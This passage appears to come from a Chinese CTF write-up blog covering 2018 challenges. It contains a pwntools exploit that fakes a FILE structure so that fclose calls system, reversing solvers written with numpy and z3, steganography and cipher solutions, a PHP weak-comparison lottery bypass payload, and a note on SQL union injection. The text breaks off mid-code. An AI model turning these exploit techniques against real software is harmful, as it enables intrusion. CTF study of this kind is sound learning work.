0xffffffff, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dcc2a0 &lt;_IO_file_jumps&gt;&#125;assassinq&gt;&gt; p *((struct _IO_FILE_plus *)stdin).vtable$4 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7a70330 &lt;_IO_new_file_finish&gt;, __overflow = 0x7ffff7a71300 &lt;_IO_new_file_overflow&gt;, __underflow = 0x7ffff7a71020 &lt;_IO_new_file_underflow&gt;, __uflow = 0x7ffff7a723c0 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ffff7a73c50 &lt;__GI__IO_default_pbackfail&gt;, __xsputn = 0x7ffff7a6f930 &lt;_IO_new_file_xsputn&gt;, __xsgetn = 0x7ffff7a6f590 &lt;__GI__IO_file_xsgetn&gt;, __seekoff = 0x7ffff7a6eb90 &lt;_IO_new_file_seekoff&gt;, __seekpos = 0x7ffff7a72990 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ffff7a6e850 &lt;_IO_new_file_setbuf&gt;, __sync = 0x7ffff7a6e6d0 &lt;_IO_new_file_sync&gt;, __doallocate = 0x7ffff7a62100 &lt;__GI__IO_file_doallocate&gt;, __read = 0x7ffff7a6f910 &lt;__GI__IO_file_read&gt;, __write = 0x7ffff7a6f190 &lt;_IO_new_file_write&gt;, __seek = 0x7ffff7a6e910 &lt;__GI__IO_file_seek&gt;, __close = 0x7ffff7a6e840 &lt;__GI__IO_file_close&gt;, __stat = 0x7ffff7a6f180 &lt;__GI__IO_file_stat&gt;, __showmanyc = 0x7ffff7a73dd0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ffff7a73de0 &lt;_IO_default_imbue&gt;&#125; 想法是把 stream 覆盖成 bss 上构造的部分，fclose 就会触发 system，Exploit： 123456789101112131415161718192021222324#!/usr/bin/env pythonfrom pwn import *binary = './task_challenge1'elf = ELF(binary)context.log_level = 'debug'context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']local = 1if local: p = process(binary)else: p = remote('202.112.51.184', 30003)ub_offset = 0x3c4b30p.sendlineafter('&gt;', '1')gdb.attach(p)buf_addr = 0x6010C0system = 0x400897payload = ( ((('\\0' * 0x10 + p64(system) + '\\0' * 70).ljust(0x88,'\\0') + p64(buf_addr)).ljust(0xd8, '\\0') + p64(buf_addr)).ljust(0x100, '\\0') + p64(buf_addr))p.sendline(payload)p.sendlineafter('&gt;', '3')p.interactive() MOBILESWAG拖进 jadx，直接看 Mainactivity 中的函数，可以知道对输入数据进行了长度的判断和内容的正则判断。然后还存在 native 层，需要对 so 文件分析。 在 ida 里能看出经过两次加密过程，仔细发现其实是矩阵的一些操作，先对矩阵转置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101char **__fastcall matrix_transpos(char **matrix)&#123; char *v1; // x8 char *v2; // x11 char *v3; // x8 char *v4; // x8 char *v5; // x8 char *v6; // x8 char *v7; // x8 char *v8; // x9 char *v9; // x8 char *v10; // x9 char *v11; // x8 char *v12; // x9 char *v13; // x8 char *v14; // x9 char *v15; // x8 char *v16; // x9 char *v17; // x8 char *v18; // x9 char *v19; // x8 char *v20; // x9 char *v21; // x8 char *v22; // x9 char *v23; // x8 char *v24; // x9 char *v25; // x8 char *v26; // x9 v1 = matrix[1]; LODWORD(v2) = *((_DWORD *)*matrix + 1); *((_DWORD *)*matrix + 1) = *(_DWORD *)v1; *(_DWORD *)v1 = (_DWORD)v2; v3 = matrix[2]; LODWORD(v2) = *((_DWORD *)*matrix + 2); *((_DWORD *)*matrix + 2) = *(_DWORD *)v3; *(_DWORD *)v3 = (_DWORD)v2; v4 = matrix[3]; LODWORD(v2) = *((_DWORD *)*matrix + 3); *((_DWORD *)*matrix + 3) = *(_DWORD *)v4; *(_DWORD *)v4 = (_DWORD)v2; v5 = matrix[4]; LODWORD(v2) = *((_DWORD *)*matrix + 4); *((_DWORD *)*matrix + 4) = *(_DWORD *)v5; *(_DWORD *)v5 = (_DWORD)v2; v6 = matrix[5]; LODWORD(v2) = *((_DWORD *)*matrix + 5); *((_DWORD *)*matrix + 5) = *(_DWORD *)v6; *(_DWORD *)v6 = (_DWORD)v2; v8 = matrix[1]; v7 = matrix[2]; LODWORD(v2) = *((_DWORD *)v8 + 2); *((_DWORD *)v8 + 2) = *((_DWORD *)v7 + 1); *((_DWORD *)v7 + 1) = (_DWORD)v2; v9 = matrix[3]; v10 = matrix[1]; LODWORD(v2) = *((_DWORD *)v10 + 3); *((_DWORD *)v10 + 3) = *((_DWORD *)v9 + 1); *((_DWORD *)v9 + 1) = (_DWORD)v2; v11 = matrix[4]; v12 = matrix[1]; LODWORD(v2) = *((_DWORD *)v12 + 4); *((_DWORD *)v12 + 4) = *((_DWORD *)v11 + 1); *((_DWORD *)v11 + 1) = (_DWORD)v2; v13 = matrix[5]; v14 = matrix[1]; LODWORD(v2) = *((_DWORD *)v14 + 5); *((_DWORD *)v14 + 5) = *((_DWORD *)v13 + 1); *((_DWORD *)v13 + 1) = (_DWORD)v2; v16 = matrix[2]; v15 = matrix[3]; LODWORD(v2) = *((_DWORD *)v16 + 3); *((_DWORD *)v16 + 3) = *((_DWORD *)v15 + 2); *((_DWORD *)v15 + 2) = (_DWORD)v2; v17 = matrix[4]; v18 = matrix[2]; LODWORD(v2) = *((_DWORD *)v18 + 4); *((_DWORD *)v18 + 4) = *((_DWORD *)v17 + 2); *((_DWORD *)v17 + 2) = (_DWORD)v2; v19 = matrix[5]; v20 = matrix[2]; LODWORD(v2) = *((_DWORD *)v20 + 5); *((_DWORD *)v20 + 5) = *((_DWORD *)v19 + 2); *((_DWORD *)v19 + 2) = (_DWORD)v2; v22 = matrix[3]; v21 = matrix[4]; LODWORD(v2) = *((_DWORD *)v22 + 4); *((_DWORD *)v22 + 4) = *((_DWORD *)v21 + 3); *((_DWORD *)v21 + 3) = (_DWORD)v2; v23 = matrix[5]; v24 = matrix[3]; LODWORD(v2) = *((_DWORD *)v24 + 5); *((_DWORD *)v24 + 5) = *((_DWORD *)v23 + 3); *((_DWORD *)v23 + 3) = (_DWORD)v2; v26 = matrix[4]; v25 = matrix[5]; LODWORD(v2) = *((_DWORD *)v26 + 5); *((_DWORD *)v26 + 5) = *((_DWORD *)v25 + 4); *((_DWORD *)v25 + 4) = (_DWORD)v2; return matrix;&#125; 再将两个矩阵相乘： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546char *__fastcall matrix_inverse(char *matrix, char *data)&#123; char *v2; // x19 char *v3; // x22 char *v4; // x20 char *v5; // x21 char *v6; // x0 __int64 i; // x8 char *v8; // x9 char *v9; // x10 __int64 j; // x11 v2 = matrix; v3 = data; v4 = (char *)malloc(48LL); v5 = (char *)malloc(24LL); *(_QWORD *)v4 = v5; *((_QWORD *)v4 + 1) = malloc(24LL); *((_QWORD *)v4 + 2) = malloc(24LL); *((_QWORD *)v4 + 3) = malloc(24LL); *((_QWORD *)v4 + 4) = malloc(24LL); v6 = (char *)malloc(24LL); i = 0LL; *((_QWORD *)v4 + 5) = v6; while ( 1 ) &#123; v9 = *(char **)&amp;v2[8 * i]; j = 0LL; do &#123; v8 = v3 + 72; *(_DWORD *)&amp;v5[j] = *(_DWORD *)&amp;v8[j - 72] * *(_DWORD *)v9 + *(_DWORD *)&amp;v8[j - 48] * *((_DWORD *)v9 + 1) + *(_DWORD *)&amp;v8[j - 24] * *((_DWORD *)v9 + 2) + *(_DWORD *)&amp;v8[j] * *((_DWORD *)v9 + 3) + *(_DWORD *)&amp;v8[j + 24] * *((_DWORD *)v9 + 4) + *(_DWORD *)&amp;v8[j + 48] * *((_DWORD *)v9 + 5); j += 4LL; &#125; while ( j != 24 ); if ( ++i == 6 ) break; v5 = *(char **)&amp;v4[8 * i]; &#125; return v4;&#125; 那么这个过程用 numpy 就能解出来，解题脚本： 12345678910111213141516171819202122232425from numpy import *enc = [ 0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [ 0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]trans_data = mat(data).reshape(6, 6)trans_enc = mat(enc).reshape(6, 6)trans = trans_enc * trans_data.Ires = trans.T.reshape(1, 36).tolist()[0]flag = ''for ch in res: flag += chr(int(round(ch)))print(flag) 因为还没学过线代，还没看懂的时候，硬生生现学现用 z3 把矩阵求逆的过程解出来了，所以顺便贴一波现学的 z3 脚本： 123456789101112131415161718192021222324from z3 import *enc = [0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]i = 0res = ''while(1): s = Solver() n0 = Int('n0') n1 = Int('n1') n2 = Int('n2') n3 = Int('n3') n4 = Int('n4') n5 = Int('n5') s.add(enc[i * 6 + 0] == n0 * data[0] + n1 * data[6] + n2 * data[12] + n3 * data[18] + n4 * data[24] + n5 * data[30]) s.add(enc[i * 6 + 1] == n0 * data[1] + n1 * data[7] + n2 * data[13] + n3 * data[19] + n4 * data[25] + n5 * data[31]) s.add(enc[i * 6 + 2] == n0 * data[2] + n1 * data[8] + n2 * data[14] + n3 * data[20] + n4 * data[26] + n5 * data[32]) s.add(enc[i * 6 + 3] == n0 * data[3] + n1 * data[9] + n2 * data[15] + n3 * data[21] + n4 * data[27] + n5 * data[33]) s.add(enc[i * 6 + 4] == n0 * data[4] + n1 * data[10] + n2 * data[16] + n3 * data[22] + n4 * data[28] + n5 * data[34]) s.add(enc[i * 6 + 5] == n0 * data[5] + n1 * data[11] + n2 * data[17] + n3 * data[23] + n4 * data[29] + n5 * data[35]) s.check() print s.model() if i == 5: break i += 1 参考网站http://yugod.xmutsec.com/index.php/2018/08/10/42.htmlhttps://www.jianshu.com/p/028c0c6270c3https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Deehttps://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0https://www.jianshu.com/p/110f715c210f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2018-QCTF","slug":"2018-QCTF","date":"2018-07-21T11:56:59.000Z","updated":"2019-08-29T00:58:28.550Z","comments":true,"path":"2018/07/21/2018-QCTF/","link":"","permalink":"blog.b3ale.cn/2018/07/21/2018-QCTF/","excerpt":"其实大部分是看着大佬 wp 的复现。感觉自己实力还是欠缺很多。","text":"其实大部分是看着大佬 wp 的复现。感觉自己实力还是欠缺很多。 MISCpicture通过 stegsolve 判断出存在最低位隐写。使用 lsb 工具解出密文，为一段加密函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290#_*_ coding:utf-8 _*_import reimport sysip= (58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9 , 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7)ip_1=(40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25)e =(32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12,13, 12, 13, 14, 15, 16, 17, 16,17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,24, 25, 26, 27, 28, 29,28, 29, 30, 31, 32, 1)p=(16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25)s=[ [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14,9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]]pc1=(57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4);pc2= (14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32)d = ( 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1)__all__=['desencode']class DES(): def __init__(self): pass def code(self,from_code,key,code_len,key_len): output=\"\" trun_len=0 code_string=self._functionCharToA(from_code,code_len) code_key=self._functionCharToA(key,key_len) if code_len%16!=0: real_len=(code_len/16)*16+16 else: real_len=code_len if key_len%16!=0: key_len=(key_len/16)*16+16 key_len*=4 trun_len=4*real_len for i in range(0,trun_len,64): run_code=code_string[i:i+64] l=i%key_len run_key=code_key[l:l+64] run_code= self._codefirstchange(run_code) run_key= self._keyfirstchange(run_key) for j in range(16): code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r code_r= self._functionE(code_r) key_l=run_key[0:28] key_r=run_key[28:56] key_l=key_l[d[j]:28]+key_l[0:d[j]] key_r=key_r[d[j]:28]+key_r[0:d[j]] run_key=key_l+key_r key_y= self._functionKeySecondChange(run_key) code_r= self._codeyihuo(code_r,key_y) code_r= self._functionS(code_r) code_r= self._functionP(code_r) code_r= self._codeyihuo(code_l,code_r) run_code+=code_r code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r+code_l output+=self._functionCodeChange(run_code) return output def _codeyihuo(self,code,key): code_len=len(key) return_list='' for i in range(code_len): if code[i]==key[i]: return_list+='0' else: return_list+='1' return return_list def _codefirstchange(self,code): changed_code='' for i in range(64): changed_code+=code[ip[i]-1] return changed_code def _keyfirstchange (self,key): changed_key='' for i in range(56): changed_key+=key[pc1[i]-1] return changed_key def _functionCodeChange(self, code): lens=len(code)/4 return_list='' for i in range(lens): list='' for j in range(4): list+=code[ip_1[i*4+j]-1] return_list+=\"%x\" %int(list,2) return return_list def _functionE(self,code): return_list='' for i in range(48): return_list+=code[e[i]-1] return return_list def _functionP(self,code): return_list='' for i in range(32): return_list+=code[p[i]-1] return return_list def _functionS(self, key): return_list='' for i in range(8): row=int( str(key[i*6])+str(key[i*6+5]),2) raw=int(str( key[i*6+1])+str(key[i*6+2])+str(key[i*6+3])+str(key[i*6+4]),2) return_list+=self._functionTos(s[i][row][raw],4) return return_list def _functionKeySecondChange(self,key): return_list='' for i in range(48): return_list+=key[pc2[i]-1] return return_list def _functionCharToA(self,code,lens): return_code='' lens=lens%16 for key in code: code_ord=int(key,16) return_code+=self._functionTos(code_ord,4) if lens!=0: return_code+='0'*(16-lens)*4 return return_code def _functionTos(self,o,lens): return_code='' for i in range(lens): return_code=str(o&gt;&gt;i &amp;1)+return_code return return_codedef tohex(string): return_string='' for i in string: return_string+=\"%02x\"%ord(i) return return_stringdef tounicode(string): return_string='' string_len=len(string) for i in range(0,string_len,2): return_string+=chr(int(string[i:i+2],16)) return return_stringdef desencode(from_code,key): from_code=tohex(from_code) key=tohex(key) des=DES() key_len=len(key) string_len=len(from_code) if string_len&lt;1 or key_len&lt;1: print 'error input' return False key_code= des.code(from_code,key,string_len,key_len) return key_codeif __name__ == '__main__': if(desencode(sys.argv[1],'mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf')=='e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72'): print 'correct.' else: print 'try again.' 解出来之后发现应该是 DES，但无从下手。后来看了孔师傅的 wp，一惊居然还有这种骚操作。 顺便记录一下__all__在 python 中： 1The only solution is for the package author to provide an explicit index of the package. The import statement uses the following convention: if a package’s init.py code defines a list named all, it is taken to be the list of module names that should be imported when from package import * is encountered. It is up to the package author to keep this list up-to-date when a new version of the package is released. Package authors may also decide not to support it, if they don’t see a use for importing * from their package. 最后用搜到的脚本解密： 1234567$ python des_1.pyDES 解密请输入密文（长度不限）:e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72请输入密钥（长度不限）:mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sfQCTF&#123;eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4&#125;按确定退出 Noise拿到一个Noise.wav，发现是my little pony theme song。尝试用mp3stego后无果。再反复听了很多次，发现有一些噪音夹杂在里面。 看一下 hint，个人认为这里最关键的是 hint2，需要了解通过消除伴奏获得人声的原理。 关于原理，利用声波叠加干涉消除原声，当声波的相位差达到 180 度的时候，就可以达到消音的效果： 跟着教程学会怎么使用Adobe Audition，使声波相位差达到 180 度。 要提取出噪音，我们要做的就是从网上下载原版的my little pony theme song，然后将Noise.wav和它的相位差调整为 180 度，就可以提取出噪音。 关于这段噪音的话，和慢扫描电视有关。利用软件MMSSTV，最后得到 flag。 X-man-Keyword也是 lsb。 密码为图片中的lovekfc。 通过提示，将LOVEKFC作为关键字提到最前面，和正常顺序的英文字母进行置换。 1234567PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;LOVEKFCABDGHIJMNPQRSTUWXYZABCDEFGHIJKLMNOPQRSTUVWXYZQCTF...// 容易发现前四位正好是QCTF 写一下脚本跑出结果： 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;int main() &#123; char s1[27] = \"lovekfcabdghijmnpqrstuwxyz\"; char s2[27] = \"abcdefghijklmnopqrstuvwxyz\"; char s3[27] = \"LOVEKFCABDGHIJMNPQRSTUWXYZ\"; char s4[27] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; char ans[39] = \"PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;\"; for(int i = 0; i &lt; strlen(ans); i++) &#123; if(islower(ans[i])) &#123; for(int j = 0; j &lt; strlen(s1); j++) &#123; if(ans[i] == s1[j]) &#123; ans[i] = s2[j]; break; &#125; &#125; &#125; else if(isupper(ans[i])) &#123; for(int j = 0; j &lt; strlen(s3); j++) &#123; if(ans[i] == s3[j]) &#123; ans[i] = s4[j]; break; &#125; &#125; &#125; else &#123; continue; &#125; &#125; printf(\"%s\", ans); return 0;&#125; X-man-A face补全二维码定位符，扫出一串类似 base64 的密文。 经过尝试，通过 base32 解码得到 flag。 WEBLottery通过 GitHack 拿到源码，在 api.php 中： 123456789101112function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION['money']; $numbers = $req['numbers']; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; $numbers即用户输入的数字，$win_numbers即随机生成的数字。根据 PHP 弱类型比较，例如TRUE和1和&quot;1&quot;相等，构造&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]即可中最高奖，得到 flag。 NewsCenter直接用联合注入判断出列数为三列后，就开始走流程 emmm。 显而易见 flag 应该在secret_table中。 在fl4g列中得到 flag： REXman-babymipsmips 逆向，看一下swing 的博客，安装一波 retdec 来反编译。 反编译出几个关键函数： check 函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdbool.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t puts(char * a1);int32_t strlen(char * a1);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(char * a1);// --------------------- Global Variables ---------------------char * g1 = \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";// ------------------------ Functions -------------------------// Address range: 0x4007f0 - 0x4009a8int32_t sub_4007F0(char * a1) &#123; int32_t v1 = (int32_t)a1; // 0x400800 char * str = (char *)v1; // 0x400800 int32_t puts_rc; if (strlen(str) &lt;= 5) &#123; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc; &#125; int32_t v2 = 5; while (true) &#123; char * v3 = (char *)(v2 + v1); // 0x4008a8 int32_t v4 = (int32_t)*v3; // 0x4008a8 char v5; if (v2 % 2 == 0) &#123; char v6 = *v3; // 0x4008cc v5 = (int32_t)v6 / 64 | 0x4000000 * v4 / 0x1000000; // branch -&gt; 0x400900 &#125; else &#123; // 0x400828 v5 = 64 * (int32_t)*v3 | v4 / 4; // branch -&gt; 0x400900 &#125; // 0x400900 *v3 = v5; int32_t v7 = v2 + 1; // 0x400908 if (v7 &gt;= strlen(str)) &#123; // break -&gt; 0x400934 break; &#125; v2 = v7; // continue -&gt; 0x400814 &#125; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc;&#125;// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:29 逻辑就是先判断奇偶，如果为奇数则将字符的高 6 位作为低 6 位，低 2 位作为高 2 位；反之为偶数，则字符的低 6 位作为高 6 位，高 2 位作为低 2 位。最后和g1check 一下。 main 函数在这里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t printf(char * a1);int32_t puts(char * a1);int32_t scanf(char * a1);void setbuf(int32_t a1, char * a2);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(int32_t a1);int32_t sub_4009A8(void);// --------------------- Global Variables ---------------------int32_t stdin = 0;int32_t stdout = 0;// ------------------------ Functions -------------------------// Address range: 0x4009a8 - 0x400af8int32_t sub_4009A8(void) &#123; // 0x4009a8 setbuf(stdout, NULL); setbuf(stdin, NULL); printf(\"Give me your flag:\"); scanf(\"%32s\"); int32_t v1 = 0; // bp-48 int32_t v2 = 0; // 0x400a58 char * v3 = (char *)((int32_t)&amp;v1 + 4 + v2); // 0x400a28 *v3 = (char)((int32_t)*v3 ^ 32 - v2); int32_t v4 = v1 + 1; // 0x400a70 v1 = v4; // branch -&gt; 0x400a1c while (v4 &lt; 32) &#123; // 0x400a1c v2 = v4; v3 = (char *)((int32_t)&amp;v1 + 4 + v2); *v3 = (char)((int32_t)*v3 ^ 32 - v2); v4 = v1 + 1; v1 = v4; // continue -&gt; 0x400a1c &#125; int32_t str = 0; // bp-44 int32_t puts_rc; if (strncmp((char *)&amp;str, \"Q|j&#123;g\", 5) == 0) &#123; // 0x400ab4 puts_rc = sub_4007F0((int32_t)&amp;str); // branch -&gt; 0x400adc &#125; else &#123; // 0x400acc puts_rc = puts(\"Wrong\"); // branch -&gt; 0x400adc &#125; // 0x400adc return puts_rc;&#125;// --------------------- 